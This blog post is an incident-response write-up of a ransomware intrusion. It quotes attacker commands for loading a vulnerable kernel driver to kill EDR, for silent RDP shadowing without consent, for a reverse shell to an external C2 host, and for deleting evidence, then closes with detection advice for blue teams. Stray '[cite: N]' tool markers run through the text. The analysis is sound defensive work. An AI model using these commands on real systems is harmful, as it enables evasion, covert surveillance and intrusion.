---
layout: post
title: "Anatomy of a Ransomware Attack: Unmasking BYOVD and RDP Shadowing in the Wild"
date: 2026-10-25 10:00:00 +0200
categories: [Security, Incident Response]
tags: [SIEM, ELK, n8n, BYOVD, Ransomware, RDP Shadowing, BlueTeam, Incident Response]
---

In the ever-evolving landscape of cyber threats, ransomware operators are increasingly abandoning custom malware in favor of "Living off the Land" (LotL) techniques and Bring Your Own Vulnerable Driver (BYOVD) attacks to evade detection[cite: 7]. 

This article provides a comprehensive, real-world forensic breakdown of a sophisticated enterprise ransomware incident targeting our infrastructure with the **.crypto24** extension[cite: 7]. By analyzing command-line histories and forensic artifacts left behind, we can dissect how a self-hosted **ELK Stack** and an **n8n automation pipeline** caught and disrupted the kill chain.

---

### Phase 1: Initial Access and Lateral Movement via LotL

Modern ransomware operators know that deploying custom malware triggers EDR solutions instantly. To bypass perimeter alerts, the threat actor relied heavily on **Living off the Land (LotL)**[cite: 8].

* **The Pivot & Credential Abuse:** Utilizing legitimate administrative tools like `PsExec64.exe`, the adversary pivoted from their initial beachhead to internal servers using high-privileged domain credentials[cite: 8]. This effectively masked the intrusion as routine IT maintenance.
* **Staging Ground:** The attacker leveraged `C:\ProgramData\Temp` as a globally writable staging ground to execute reconnaissance scripts (`check.bat`) and staging payloads (`helper.exe`)[cite: 8].
* **Active Surveillance & OPSEC:** The logs revealed aggressive situational awareness. The attacker repeatedly queried active user sessions and forcefully terminated active IT staff sessions (`logoff 2`) to operate uninterrupted and avoid real-time discovery[cite: 8].

---

### Phase 2: Defense Evasion - EDR Neutralization via BYOVD

The most technically sophisticated phase of the intrusion was the complete blinding of the EDR ecosystem (specifically neutralizing active agents like `avp.exe`) without exploiting zero-days in the security software itself.

The adversary executed a flawless **Bring Your Own Vulnerable Driver (BYOVD)** attack by registering a malicious kernel-mode service using native Windows tools:

```
sc.exe create flash binPath= "C:\Users\administrator...\AppData\Local\Temp\4.bin" type= kernel && sc.exe start flash
```

* **The Logic:** By bypassing Driver Signature Enforcement (DSE) using a legitimate, signed legacy driver containing known arbitrary memory read/write vulnerabilities (staged as ```4.bin```), the attacker gained Ring 0 kernel-level access[cite: 9].

* **The Impact:** Operating above user-mode security processes, the rogue driver systematically terminated protected EDR processes (```avp.exe```), throwing the system into total blindness and allowing subsequent encryption binaries (```.crypto24```) to execute completely unhindered[cite: 9].
### Phase 3: Stealth, Persistence, and RDP Shadowing

With endpoint defenses paralyzed, the adversary embedded themselves deep within the architecture using native Windows features and stealth backdoors:

* **The "Invisible" Administrator:** Created a local backdoor account named ```DefaultUser``` added to the Administrators group, then hid it from the Windows logon screen via Registry modification (```SpecialAccounts\UserList``` with DWORD ```0```).

* **Disguised Services:** Deployed stripped instances of TightVNC renamed to ```storage.exe``` and ```hookldr.exe```, running under deceptive service names like ```MicrosoftStorage```.

* **RDP Shadowing (The Silent Watcher):** One of the most chilling discoveries was the execution of:
```mstsc /shadow:1 /v:localhost /noConsentPrompt```
By hijacking this legitimate helpdesk feature with the /noConsentPrompt flag, the attacker silently watched active user screens in real-time without notifying the victim, ensuring the coast was clear before launching the final encryption payload.   

### Phase 4: C2, Anti-Forensics, and Exfiltration Interception
* **C2 Channel:** Established an interactive reverse shell (```adv.exe -r [C2_IP] -s 444```) to an external VPS hosted on Ultahost over port 444.

* **Anti-Forensics:** Systematically deleted staging scripts and binaries (```del /f /q hookldr.exe```, ```del c:\windows\run.bat```) to hinder post-incident analysis.

* **Thwarting Double Extortion:** Browser artifacts revealed the attacker downloading ```7-Zip``` and ```Rclone``` for data compression and cloud exfiltration. However, due to proactive network monitoring and automated alerts established via our ELK Stack and n8n pipeline, outbound connections were severed just in time—containing the attack before a single byte of sensitive data left the network.

### Key Takeaways for Blue Teams

1. Enable the Vulnerable Driver Blocklist: Enforce Driver Signature Enforcement and Microsoft's Vulnerable Driver Blocklist to prevent known exploitable drivers (like ```flash```) from loading into the kernel.

2. Monitor Service Creation (```sc.exe```): Set up strict SIEM/EDR detection rules for ```sc.exe``` creating services with ```type= kernel```.

3. Detect RDP Shadowing: Monitor command-line execution for ```mstsc.exe``` involving ```/shadow:``` and ```/noConsentPrompt```.

4. Leverage Automation (ELK + n8n): Detection without automation is just noise. Bridging SIEM alerts with automation frameworks allows immediate containment before manual intervention is even possible.

Stay secure, and keep building defenses from the ground up! 🛡️